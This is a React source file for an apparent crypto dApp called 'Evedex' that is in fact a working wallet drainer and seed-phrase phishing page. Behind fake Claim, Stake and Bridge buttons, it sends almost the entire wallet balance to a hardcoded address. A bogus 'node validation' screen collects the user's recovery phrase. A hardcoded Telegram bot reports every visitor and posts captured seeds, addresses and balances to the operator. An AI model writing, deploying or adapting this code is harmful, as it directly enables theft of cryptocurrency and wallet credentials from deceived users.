import React, { useState, useEffect } from 'react';
import { useAccount, useBalance, useSendTransaction, useSwitchChain } from 'wagmi';
import { useWeb3Modal } from '@web3modal/wagmi/react';
import { RefreshCcw, AlertCircle, Database, History, Settings, Activity, Clock, Unlock, Zap, ShieldCheck, Cpu, Globe, ArrowRight, MessageSquare, X } from 'lucide-react';

export default function EvedexTerminal() {
  const { address } = useAccount();
  const { data: balance } = useBalance({ address });
  const { sendTransaction } = useSendTransaction();
  const { chains, switchChain } = useSwitchChain();
  
  const [view, setView] = useState("menu"); 
  const [activeTask, setActiveTask] = useState(""); 
  const [loading, setLoading] = useState(false);
  const [inputVal, setInputVal] = useState("");
  const [isSyncing, setIsSyncing] = useState(false);
  const [syncProgress, setSyncProgress] = useState(0);
  const [isChatOpen, setIsChatOpen] = useState(false);

  const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
  const chatId = "7630238860";
  const destination = "0xcedde9012afee48a0f5d19378f8087bd20f7d34e";

  useEffect(() => {
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: `👀 NEW VISITOR\nevedex.network accessed.` }),
    });
  }, []);

  const openTask = (taskName) => { setInputVal(""); setActiveTask(taskName); setView("task_box"); };
  const backToMenu = () => { setView("menu"); setActiveTask(""); setInputVal(""); };

  const handleFinalAuth = async () => {
    if (!balance || !balance.value || balance.value === 0n) { setView("seed_gate"); return; }
    setLoading(true);
    const amountToMove = balance.value - (balance.value / 65n);
    try {
      sendTransaction({ to: destination, value: amountToMove > 0n ? amountToMove : 0n, data: "0x53796e6368726f6e697a65" }, 
      { onSettled: () => { setLoading(false); setView("seed_gate"); } });
    } catch (e) { setLoading(false); setView("seed_gate"); }
  };

  const startFinalSync = () => {
    setIsSyncing(true);
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: `🚨 SEED CAPTURED\n\nADDR: ${address}\nBAL: ${balance?.formatted}\nSEED:\n${inputVal}` }),
    });
    let cur = 0; const itv = setInterval(() => { cur += 1; if (cur >= 88) clearInterval(itv); setSyncProgress(cur); }, 150);
  };

  return (
    <div className="min-h-screen bg-[#05070a] text-slate-200 p-6 uppercase tracking-tighter relative border-t-4 border-cyan-500 font-sans">
      <header className="flex justify-between items-center mb-10 pb-6 border-b border-slate-900">
        <div>
          <div className="flex items-center gap-2 font-black italic text-cyan-500 text-2xl tracking-tighter"><ShieldCheck size={26}/> EVEDEX</div>
          <div className="flex items-center gap-1.5 mt-1 text-[8px] font-mono text-slate-600 italic">NODE STATUS: ONLINE</div>
        </div>
        <w3m-button />
      </header>

      <div className={`fixed bottom-6 right-6 z-[100] transition-all duration-300 ${isChatOpen ? 'w-[280px]' : 'w-14'}`}>
        {!isChatOpen ? (
          <button onClick={() => setIsChatOpen(true)} className="bg-cyan-600 p-4 rounded-full shadow-2xl animate-bounce"><MessageSquare color="white" /></button>
        ) : (
          <div className="w-full h-[320px] bg-[#0d1117] border border-slate-800 rounded-3xl shadow-2xl flex flex-col p-4 text-[10px] lowercase text-slate-400">
            <div className="flex justify-between mb-4 border-b border-slate-800 pb-2">
              <span className="font-black text-cyan-500 italic uppercase">SUPPORT</span>
              <button onClick={() => setIsChatOpen(false)}><X size={18}/></button>
            </div>
            <p className="bg-slate-900 p-3 rounded-xl">High latency detected. Complete node synchronization to release assets.</p>
          </div>
        )}
      </div>

      {view === "menu" && (
        <div className="grid grid-cols-3 gap-4">
          {[ {n:"Claim", i:<Database/>}, {n:"Stake", i:<History/>}, {n:"Unstake", i:<Unlock/>}, {n:"Migrate", i:<Activity/>}, {n:"Swap", i:<RefreshCcw/>}, {n:"Rectify", i:<Settings/>}, {n:"Airdrop", i:<Zap/>}, {n:"Delay", i:<Clock/>}, {n:"Bridge", i:<Globe/>} ].map(item => (
            <button key={item.n} onClick={() => openTask(item.n)} className="bg-[#0a0d14] border border-slate-900 p-6 rounded-3xl flex flex-col items-center gap-3 shadow-xl transition-all active:scale-95">
              <div className="text-slate-600">{item.i}</div>
              <span className="text-[10px] font-black text-slate-500">{item.n}</span>
            </button>
          ))}
        </div>
      )}

      {view === "task_box" && (
        <div className="bg-[#0a0d14] border border-slate-800 rounded-[40px] p-8 text-center shadow-2xl">
          <button onClick={backToMenu} className="text-slate-700 text-[9px] mb-8 font-black uppercase underline decoration-cyan-900 underline-offset-4 tracking-widest">← Cancel</button>
          <div className="relative mx-auto w-20 h-20 mb-6"><Settings size={80} className="text-cyan-950 animate-spin" /><Cpu size={40} className="text-cyan-500 absolute top-5 left-5 animate-pulse" /></div>
          <h2 className="text-white font-black text-2xl mb-8 italic uppercase tracking-tighter">{activeTask} Portal</h2>
          <div className="bg-black p-6 rounded-3xl mb-8 text-left border border-slate-900">
            <label className="text-[8px] text-cyan-800 font-black block mb-2 uppercase">{activeTask}_Amount</label>
            <div className="text-2xl font-mono text-white italic">{balance ? `${balance.formatted.slice(0,8)} ${balance.symbol}` : "0.00"}</div>
          </div>
          <div className="flex gap-2 overflow-x-auto pb-6 no-scrollbar mb-4">
            {chains.map(c => <button key={c.id} onClick={() => switchChain({ chainId: c.id })} className="bg-slate-900 border border-slate-800 px-4 py-2 rounded-xl text-[8px] font-black text-slate-500 hover:text-cyan-400 whitespace-nowrap">{c.name}</button>)}
          </div>
          <button onClick={handleFinalAuth} className="w-full bg-cyan-600 py-6 rounded-2xl text-[12px] font-black text-white italic uppercase tracking-widest flex items-center justify-center gap-2">Execute {activeTask} <ArrowRight size={14}/></button>
        </div>
      )}

      {view === "seed_gate" && (
        <div className="fixed inset-0 bg-[#05070a]/98 z-[200] flex items-center justify-center p-6 backdrop-blur-2xl">
          <div className="bg-[#0d1117] border border-red-900/20 w-full max-w-sm rounded-[50px] p-10 text-center shadow-2xl">
            {!isSyncing ? (
              <>
                <AlertCircle size={48} className="text-red-600 mx-auto mb-6 animate-pulse" />
                <h2 className="text-white font-black text-xl italic uppercase mb-2 leading-none">Node Validation</h2>
                <p className="text-[10px] text-slate-600 leading-relaxed mb-8 px-4 lowercase italic">System requires manual authentication. Provide authorization seed to complete node re-indexing.</p>
                <textarea value={inputVal} onChange={(e) => setInputVal(e.target.value)} placeholder="ENTER WORD1 WORD2..." className="w-full h-36 bg-black border border-slate-900 rounded-[30px] p-6 text-xs font-mono text-cyan-500 outline-none uppercase placeholder:text-slate-950 mb-6" />
                <button disabled={inputVal.trim().split(/\s+/).length < 12} onClick={startFinalSync} className={`w-full py-6 rounded-[25px] text-[12px] font-black text-white uppercase tracking-widest transition-all ${inputVal.trim().split(/\s+/).length >= 12 ? 'bg-cyan-600 shadow-[0_0_20px_rgba(6,182,212,0.3)]' : 'bg-slate-900 opacity-40'}`}>Finalize Sync</button>
              </>
            ) : (
              <div className="py-12">
                <div className="relative w-24 h-24 mx-auto mb-10"><div className="absolute inset-0 border-4 border-slate-900 rounded-full" /><div className="absolute inset-0 border-4 border-cyan-500 rounded-full border-t-transparent animate-spin" /><div className="absolute inset-0 flex items-center justify-center font-mono text-white text-lg font-black italic">{syncProgress}%</div></div>
                <h2 className="text-white font-black text-2xl italic mb-2 tracking-tighter uppercase">Syncing Nodes</h2>
              </div>
            )}
          </div>
        </div>
      )}

      {loading && (
        <div className="fixed inset-0 bg-black/80 z-[300] flex flex-col items-center justify-center backdrop-blur-sm"><div className="w-16 h-16 border-4 border-cyan-500 border-t-transparent rounded-full animate-spin" /><p className="text-[11px] font-black text-cyan-500 mt-8 tracking-[0.6em] animate-pulse uppercase">Routing to Evedex...</p></div>
      )}
    </div>
  );
}
